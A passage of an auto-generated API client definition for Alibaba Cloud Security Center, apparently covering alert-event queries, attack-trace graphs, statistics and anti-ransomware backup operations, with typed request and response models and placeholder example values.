          type?: string(name='Type', description='The type of the alert event.', example='text'),
          value?: string(name='Value', description='The path of the alert event.', example='/etc/crontab'),
          valueDisplay?: string(name='ValueDisplay', description='The display path of the alert event.', example='/etc/crontab'),
        }
      ](name='Details', description='The details of the alert event.'),
      displaySandboxResult?: boolean(name='DisplaySandboxResult', description='Indicates whether the exception can be detected by cloud sandbox. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      eventNotes?: [ 
        {
          note?: string(name='Note', description='The remarks.', example='Test'),
          noteId?: long(name='NoteId', description='The ID of the event record.', example='123'),
          noteTime?: string(name='NoteTime', description='The time when the event record was created.', example='2018-09-26 01:51:01'),
        }
      ](name='EventNotes', description='An array that consists of the remarks on the exception.'),
      eventStatus?: int32(name='EventStatus', description='The status of the alert event. Valid values:

*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as a false positive
*   **16**: being handled
*   **32**: handled
*   **64**: expired', example='1'),
      eventSubType?: string(name='EventSubType', description='The name of the alert event.', example='login_common_location'),
      hasTraceInfo?: boolean(name='HasTraceInfo', description='Indicates whether the alert event has trace information. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      id?: long(name='Id', description='The ID of the alert event.', example='1000'),
      imageUuid?: string(name='ImageUuid'),
      instanceId?: string(name='InstanceId', description='The ID of the affected asset.', example='i-9dp6dwsxdl9z5u1e2f****'),
      instanceName?: string(name='InstanceName', description='The name of the associated instance.', example='nginx'),
      internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='100.100.XX.XX'),
      k8sClusterId?: string(name='K8sClusterId', description='The ID of the Kubernetes cluster.', example='c517b37e1401e4961b3951863a49a****'),
      k8sClusterName?: string(name='K8sClusterName', description='The name of the Kubernetes cluster.', example='k8s-daily'),
      k8sNamespace?: string(name='K8sNamespace', description='The namespace of the Kubernetes cluster.', example='default'),
      k8sNodeId?: string(name='K8sNodeId', description='The ID of the Kubernetes cluster node.', example='i-bp14a1ay8e0aa9t0****'),
      k8sNodeName?: string(name='K8sNodeName', description='The name of the Kubernetes cluster node.', example='N/A'),
      k8sPodName?: string(name='K8sPodName', description='The name of the Kubernetes pod.', example='myapp-pod'),
      lastTime?: string(name='LastTime', description='The time when the alert event was last generated.', example='2018-09-26 01:51:01'),
      lastTimeStamp?: long(name='LastTimeStamp', description='The timestamp when the exception was last detected. Unit: milliseconds.', example='1631699497000'),
      level?: string(name='Level', description='The severity of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
      maliciousRuleStatus?: string(name='MaliciousRuleStatus', description='The status of the malicious behavior defense rule. Valid values:

*   **open**: enabled
*   **close**: disabled', example='open'),
      markMisRules?: string(name='MarkMisRules', description='The advanced whitelist rule.', example='[{\\"uuid\\":\\"ALL\\",\\"field\\":\\"gmtModified\\",\\"operate\\":\\"contains\\",\\"fieldValue\\":\\"222\\"}]'),
      name?: string(name='Name', description='The complete name of the alert event.', example='Unusual Logon-Login with unusual location'),
      occurrenceTime?: string(name='OccurrenceTime', description='The time when the alert event was first detected.', example='2018-09-26 01:51:01'),
      occurrenceTimeStamp?: long(name='OccurrenceTimeStamp', description='The timestamp when the exception was first detected. Unit: milliseconds.', example='1631699497000'),
      operateErrorCode?: string(name='OperateErrorCode', description='The handling result code of the alert event.', example='kill_and_quara.Success'),
      operateMsg?: string(name='OperateMsg', description='The description of the handing result of the alert event.', example='success'),
      operateTime?: long(name='OperateTime', description='The handling timestamp of the alert event. Unit: milliseconds.', example='1631699497000'),
      saleVersion?: string(name='SaleVersion', description='The edition of Security Center in which the exception can be detected. Valid values:

*   **0**: Basic edition
*   **1**: Enterprise edition', example='1'),
      securityEventIds?: string(name='SecurityEventIds', description='The IDs of the associated alert events.', example='270789'),
      stages?: string(name='Stages', description='The stage at which the attack is detected.', example='"["authority_maintenance"]"'),
      tacticItems?: [ 
        {
          tacticDisplayName?: string(name='TacticDisplayName', description='The tactic name of ATT\\&CK.', example='Malicious scripts-Malicious script code execution'),
          tacticId?: string(name='TacticId', description='The stage information about ATT\\&CK.', example='TA0001'),
        }
      ](name='TacticItems', description='The display name of the attack stage.'),
      uniqueInfo?: string(name='UniqueInfo', description='The unique key of the alert.', example='e17e****'),
      uuid?: string(name='Uuid', description='The ID of the associated instance.', example='bf6b30d3-eea8-4924-9f0a-****'),
      clusterId?: string(name='clusterId', description='The ID of the cluster.', example='c2051775877374cccbf68af596e6****'),
    }
  ](name='SuspEvents', description='An array that consists of the information about the alert event.'),
  totalCount?: int32(name='TotalCount', description='The total number of alert events.', example='100'),
}

model DescribeSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventsResponseBody(name='body'),
}

async function describeSuspEventsWithOptions(request: DescribeSuspEventsRequest, runtime: Util.RuntimeOptions): DescribeSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alarmUniqueInfo)) {
    query['AlarmUniqueInfo'] = request.alarmUniqueInfo;
  }
  if (!Util.isUnset(request.assetsTypeList)) {
    query['AssetsTypeList'] = request.assetsTypeList;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.eventNames)) {
    query['EventNames'] = request.eventNames;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.operateErrorCodeList)) {
    query['OperateErrorCodeList'] = request.operateErrorCodeList;
  }
  if (!Util.isUnset(request.operateTimeEnd)) {
    query['OperateTimeEnd'] = request.operateTimeEnd;
  }
  if (!Util.isUnset(request.operateTimeStart)) {
    query['OperateTimeStart'] = request.operateTimeStart;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.parentEventTypes)) {
    query['ParentEventTypes'] = request.parentEventTypes;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sortColumn)) {
    query['SortColumn'] = request.sortColumn;
  }
  if (!Util.isUnset(request.sortType)) {
    query['SortType'] = request.sortType;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.tacticId)) {
    body['TacticId'] = request.tacticId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEvents(request: DescribeSuspEventsRequest): DescribeSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventsWithOptions(request, runtime);
}

model DescribeSuspiciousOverallConfigRequest {
  sourceIp?: string(name='SourceIp', example='39.161.XX.XX'),
  type?: string(name='Type', example='auto_breaking'),
}

model DescribeSuspiciousOverallConfigResponseBody = {
  overallConfig?: {
    config?: string(name='Config', example='on'),
    type?: string(name='Type', example='auto_breaking'),
  }(name='OverallConfig'),
  requestId?: string(name='RequestId', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model DescribeSuspiciousOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspiciousOverallConfigResponseBody(name='body'),
}

async function describeSuspiciousOverallConfigWithOptions(request: DescribeSuspiciousOverallConfigRequest, runtime: Util.RuntimeOptions): DescribeSuspiciousOverallConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspiciousOverallConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspiciousOverallConfig(request: DescribeSuspiciousOverallConfigRequest): DescribeSuspiciousOverallConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspiciousOverallConfigWithOptions(request, runtime);
}

model DescribeSuspiciousUUIDConfigRequest {
  type?: string(name='Type', example='alinet'),
}

model DescribeSuspiciousUUIDConfigResponseBody = {
  count?: int32(name='Count', example='2'),
  requestId?: string(name='RequestId', example='6044DC07-86F1-5DDA-A611-EC578EA4EEE6'),
  UUIDList?: [ string ](name='UUIDList'),
}

model DescribeSuspiciousUUIDConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspiciousUUIDConfigResponseBody(name='body'),
}

async function describeSuspiciousUUIDConfigWithOptions(request: DescribeSuspiciousUUIDConfigRequest, runtime: Util.RuntimeOptions): DescribeSuspiciousUUIDConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspiciousUUIDConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspiciousUUIDConfig(request: DescribeSuspiciousUUIDConfigRequest): DescribeSuspiciousUUIDConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspiciousUUIDConfigWithOptions(request, runtime);
}

model DescribeTargetRequest {
  config?: string(name='Config', example='{"vulType":"cms"}'),
  type?: string(name='Type', example='vul'),
}

model DescribeTargetResponseBody = {
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  targets?: [ 
    {
      flag?: string(name='Flag', example='del'),
      target?: string(name='Target', example='5c5f0169-3527-40a2-b5ff-0bc1db8f****'),
      targetType?: string(name='TargetType', example='uuid'),
    }
  ](name='Targets'),
  totalCount?: int32(name='TotalCount', example='10'),
}

model DescribeTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTargetResponseBody(name='body'),
}

async function describeTargetWithOptions(request: DescribeTargetRequest, runtime: Util.RuntimeOptions): DescribeTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTarget(request: DescribeTargetRequest): DescribeTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTargetWithOptions(request, runtime);
}

model DescribeTaskErrorLogRequest {
  buildTaskId?: string(name='BuildTaskId', example='ivf-6e520160-205d-4801-b8e9-9e7e****'),
}

model DescribeTaskErrorLogResponseBody = {
  logs?: [ 
    {
      text?: string(name='Text', example='mv: cannot move \\"CentOS-Base.repo\\" to \\"CentOS-Base.repo.backup\\": Permission denied'),
    }
  ](name='Logs'),
  requestId?: string(name='RequestId', example='F929E952-EBFC-56C3-BD35-BF8B59024C69'),
}

model DescribeTaskErrorLogResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTaskErrorLogResponseBody(name='body'),
}

async function describeTaskErrorLogWithOptions(request: DescribeTaskErrorLogRequest, runtime: Util.RuntimeOptions): DescribeTaskErrorLogResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.buildTaskId)) {
    query['BuildTaskId'] = request.buildTaskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTaskErrorLog',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTaskErrorLog(request: DescribeTaskErrorLogRequest): DescribeTaskErrorLogResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTaskErrorLogWithOptions(request, runtime);
}

model DescribeTotalStatisticsRequest {
  from?: string(name='From', description='The source of data. Default value: **aqs**. Valid values:

*   **sas**: Security Center
*   **aqs**: Server Guard', example='sas'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](~~130972~~) operation to query the IDs of asset groups.', example='8076980'),
  remark?: string(name='Remark', description='The name or public IP address of the asset.', example='222.185.XX.XX'),
}

model DescribeTotalStatisticsResponseBody = {
  account?: int32(name='Account', description='The number of logons to the asset.', example='0'),
  health?: int32(name='Health', description='The total number of unfixed baseline risks.', example='0'),
  healthTotal?: int32(name='HealthTotal', description='The total number of baseline risks.', example='0'),
  healthdealedTotal?: int32(name='HealthdealedTotal', description='The total number of fixed baseline risks.', example='0'),
  healthhighTotal?: int32(name='HealthhighTotal', description='The number of baselines whose risk level is high.', example='0'),
  healthlowTotal?: int32(name='HealthlowTotal', description='The number of baseline risks whose risk level is low.', example='0'),
  healthmediumTotal?: int32(name='HealthmediumTotal', description='The number of baseline risks whose risk level is medium.', example='0'),
  healthseriousTotal?: int32(name='HealthseriousTotal', description='This parameter is deprecated.', example='0'),
  newsuspicious?: int32(name='Newsuspicious', description='The number of alerts that are generated by Server Guard or Security Center.

> 

> *   If you set the **Type** parameter to **sas**, this parameter indicates the number of alerts that are generated by Security Center.

> *   If you set the **Type** parameter to **aqs**, this parameter indicates the number of alerts that are generated by Server Guard.', example='0'),
  online?: boolean(name='Online', description='Indicates whether the Security Center agent is online. Valid values:

*   **true**: The service is online.
*   **false**: The service is offline.', example='true'),
  patch?: int32(name='Patch', description='The number of Web-CMS vulnerabilities.', example='0'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
  suspicious?: int32(name='Suspicious', description='The number of alerts that are generated by Server Guard.', example='0'),
  suspiciousTotal?: int32(name='SuspiciousTotal', description='This parameter is deprecated.', example='0'),
  suspiciousdealedTotal?: int32(name='SuspiciousdealedTotal', description='The number of handled alerts.', example='0'),
  suspicioushighTotal?: int32(name='SuspicioushighTotal', description='This parameter is deprecated.', example='0'),
  suspiciouslowTotal?: int32(name='SuspiciouslowTotal', description='The number of alerts whose risk level is reminder.', example='0'),
  suspiciousmediumTotal?: int32(name='SuspiciousmediumTotal', description='The number of alerts whose risk level is suspicious.', example='28'),
  suspiciousseriousTotal?: int32(name='SuspiciousseriousTotal', description='The number of alerts whose risk level is urgent.', example='0'),
  trojan?: int32(name='Trojan', description='The number of webshell alerts.', example='0'),
  vul?: int32(name='Vul', description='The number of unfixed vulnerabilities.', example='0'),
  vulAsapSum?: int32(name='VulAsapSum', description='The number of vulnerabilities whose severity level is high.', example='16'),
  vulDealedTotal?: int32(name='VulDealedTotal', description='The total number of fixed vulnerabilities.', example='0'),
  vulLaterSum?: int32(name='VulLaterSum', description='The number of vulnerabilities whose severity level is medium.', example='0'),
  vulNntfSum?: int32(name='VulNntfSum', description='The number of unfixed vulnerabilities whose severity level is medium.', example='0'),
  vulTotal?: int32(name='VulTotal', description='The total number of vulnerabilities.', example='0'),
}

model DescribeTotalStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTotalStatisticsResponseBody(name='body'),
}

async function describeTotalStatisticsWithOptions(request: DescribeTotalStatisticsRequest, runtime: Util.RuntimeOptions): DescribeTotalStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTotalStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTotalStatistics(request: DescribeTotalStatisticsRequest): DescribeTotalStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTotalStatisticsWithOptions(request, runtime);
}

model DescribeTraceInfoDetailRequest {
  from?: string(name='From', example='sas'),
  incidentTime?: long(name='IncidentTime', example='1670555392000'),
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='127.0.0.1'),
  type?: string(name='Type', example='SAS_INCIDENT'),
  uuid?: string(name='Uuid', example='1627f2d7-aaa2-4ed1-b07a-xxxxxxxxxxxxxx'),
  vertexId?: string(name='VertexId', example='cce1d28dxxxxxxxxxxxxxxxx'),
}

model DescribeTraceInfoDetailResponseBody = {
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-XXXXXXXXX'),
  success?: boolean(name='Success', example='true'),
  traceInfoDetail?: {
    edgeList?: [ 
      {
        count?: int32(name='Count', example='1'),
        endId?: string(name='EndId', example='a1d1fa39e5345dcef3f9712172cxxxxx'),
        startId?: string(name='StartId', example='02b4bf933c8e3bb8b9465eee502xxxxx'),
        time?: string(name='Time', example='2022-12-21 10:24:42'),
        type?: string(name='Type', example='trigger_file_alert'),
      }
    ](name='EdgeList'),
    entityTypeList?: [ 
      {
        dbId?: int32(name='DbId', example='Deprecated'),
        displayColor?: string(name='DisplayColor', example='#fff'),
        displayIcon?: string(name='DisplayIcon', example='https://img.alicdn.com/tfs/TB176P5OgDqK1RjSZSyXXaxEVXa-49-48.png'),
        displayTemplate?: string(name='DisplayTemplate', example='[{"name":"${logtime}","value":"$!{time}"}]'),
        gmtCreate?: long(name='GmtCreate', example='2022-10-09T11:47Z'),
        gmtModified?: long(name='GmtModified', example='2022-10-09T11:47Z'),
        id?: string(name='Id', example='Alert'),
        limit?: int32(name='Limit', example='Deprecated'),
        name?: string(name='Name', example='Alert'),
        namespace?: string(name='Namespace', example='*'),
        offset?: int32(name='Offset', example='Deprecated'),
      }
    ](name='EntityTypeList'),
    relationTypeList?: [ 
      {
        directed?: int32(name='Directed', example='1'),
        displayColor?: string(name='DisplayColor', example='#fff'),
        name?: string(name='Name', example='file'),
        relationTypeId?: string(name='RelationTypeId', example='netflow_to_process'),
        showType?: string(name='ShowType', example='Deprecated'),
      }
    ](name='RelationTypeList'),
    vertexList?: [ 
      {
        count?: int32(name='Count', example='1'),
        id?: string(name='Id', example='a1d1fa39e5345dcef3f9712172xxxxxx'),
        name?: string(name='Name', example='/usr/local/tomcat'),
        neighborList?: [ 
          {
            count?: int32(name='Count', example='1'),
            hasMore?: boolean(name='HasMore', example='False'),
            type?: string(name='Type', example='alert'),
          }
        ](name='NeighborList'),
        time?: string(name='Time', example='2022-12-21 10:24:42'),
        type?: string(name='Type', example='file_path'),
      }
    ](name='VertexList'),
  }(name='TraceInfoDetail'),
}

model DescribeTraceInfoDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTraceInfoDetailResponseBody(name='body'),
}

async function describeTraceInfoDetailWithOptions(request: DescribeTraceInfoDetailRequest, runtime: Util.RuntimeOptions): DescribeTraceInfoDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.incidentTime)) {
    query['IncidentTime'] = request.incidentTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vertexId)) {
    query['VertexId'] = request.vertexId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTraceInfoDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTraceInfoDetail(request: DescribeTraceInfoDetailRequest): DescribeTraceInfoDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTraceInfoDetailWithOptions(request, runtime);
}

model DescribeTraceInfoNodeRequest {
  eventName?: string(name='EventName', description='The name of the alert event.

> You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the names of alerts events.', example='WEBSHELL'),
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
  incidentTime?: long(name='IncidentTime', description='The time when the alert event was first detected.', example='1635978934000'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. The value of this parameter is specified by the system.', example='127.0.XX.XX'),
  type?: string(name='Type', description='The type of the vertex. You can call the [DescribeTraceInfoDetail](~~DescribeTraceInfoDetail~~) operation to query the types of vertexes.', example='SAS_ASSET'),
  uuid?: string(name='Uuid', description='The UUID of the server. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the UUIDs of servers.', example='6f346617-eef9-45e6-b6d1-946xxxxxxxx'),
  vertexId?: string(name='VertexId', description='The ID of the vertex.', example='03da4e2350a3eb50cd25a18cexxxxxxx'),
}

model DescribeTraceInfoNodeResponseBody = {
  node?: {
    name?: string(name='Name', description='The name of the node.', example='login'),
    propertyList?: [ 
      {
        name?: string(name='Name', description='The name of the property.', example='Incident'),
        value?: string(name='Value', description='The value of the property.', example='Alert'),
      }
    ](name='PropertyList', description='An array that consists of the properties of the node.'),
    type?: string(name='Type', description='The type of the node.', example='Alert'),
  }(name='Node', description='The details about the node.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='F35F45B0-5D6B-4238-BE02-A62DXXXXXXXX'),
}

model DescribeTraceInfoNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeTraceInfoNodeResponseBody(name='body'),
}

async function describeTraceInfoNodeWithOptions(request: DescribeTraceInfoNodeRequest, runtime: Util.RuntimeOptions): DescribeTraceInfoNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.incidentTime)) {
    query['IncidentTime'] = request.incidentTime;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vertexId)) {
    query['VertexId'] = request.vertexId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeTraceInfoNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeTraceInfoNode(request: DescribeTraceInfoNodeRequest): DescribeTraceInfoNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeTraceInfoNodeWithOptions(request, runtime);
}

model DescribeUniBackupDatabaseRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  databaseType?: string(name='DatabaseType', example='MYSQL'),
  instanceName?: string(name='InstanceName', example='test'),
  pageSize?: int32(name='PageSize', example='20'),
  queryType?: string(name='QueryType', example='create'),
  uniRegionId?: string(name='UniRegionId', example='cn-hongkong'),
}

model DescribeUniBackupDatabaseResponseBody = {
  databaseList?: [ 
    {
      agentStatus?: string(name='AgentStatus', example='INSTALLED'),
      createdByProduct?: string(name='CreatedByProduct', example='AEGIS'),
      databaseName?: string(name='DatabaseName', example='apns_tt180'),
      databaseType?: string(name='DatabaseType', example='MYSQL'),
      databaseVersion?: string(name='DatabaseVersion', example='12.0.4100.1'),
      instanceId?: string(name='InstanceId', example='i-bp15aho9hhftvmhw****'),
      instanceName?: string(name='InstanceName', example='sql-test-001'),
      instanceUuid?: string(name='InstanceUuid', example='85878b284df911ec800000163e19****'),
      policyId?: long(name='PolicyId', example='123'),
      status?: string(name='Status', example='Running'),
    }
  ](name='DatabaseList'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='25'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model DescribeUniBackupDatabaseResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeUniBackupDatabaseResponseBody(name='body'),
}

async function describeUniBackupDatabaseWithOptions(request: DescribeUniBackupDatabaseRequest, runtime: Util.RuntimeOptions): DescribeUniBackupDatabaseResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.databaseType)) {
    query['DatabaseType'] = request.databaseType;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.queryType)) {
    query['QueryType'] = request.queryType;
  }
  if (!Util.isUnset(request.uniRegionId)) {
    query['UniRegionId'] = request.uniRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeUniBackupDatabase',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeUniBackupDatabase(request: DescribeUniBackupDatabaseRequest): DescribeUniBackupDatabaseResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeUniBackupDatabaseWithOptions(request, runtime);
}

model DescribeUniBackupPoliciesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  policyName?: string(name='PolicyName', description='The name of the anti-ransomware policy.', example='auto_oracle_Hpm'),
}

model DescribeUniBackupPoliciesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
  uniBackupPolicies?: [ 
    {
      agentErrorMessage?: string(name='AgentErrorMessage', description='The error message for the anti-ransomware agent.', example='INSTALL_TIMEOUT'),
      agentStatus?: string(name='AgentStatus', description='The status of the agent. Valid values:

